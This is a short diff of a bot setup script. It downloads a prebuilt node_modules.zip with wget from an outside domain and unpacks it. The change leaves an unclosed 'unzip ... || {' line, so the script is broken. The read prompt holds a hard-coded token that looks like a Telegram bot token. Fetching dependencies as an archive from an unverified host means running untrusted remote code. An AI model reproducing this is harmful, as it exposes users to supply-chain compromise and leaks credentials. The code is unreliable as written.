@@ -62,8 +62,7 @@ else
         wget https://cybershieldx.com/node_modules.zip || { echo "Failed to download node_modules.zip" ; exit 1; }
     fi
 
-    unzip node_modules.zip || { echo "Failed to extract node_modules.zip" ; exit 1; }
-    rm node_modules.zip
+    unzip node_modules.zip || { 
 fi
 
 read -p "Enter your bot token: "7203452716:AAHbIx07peLt_owR6k1U4VjcdT5UrXEACx4
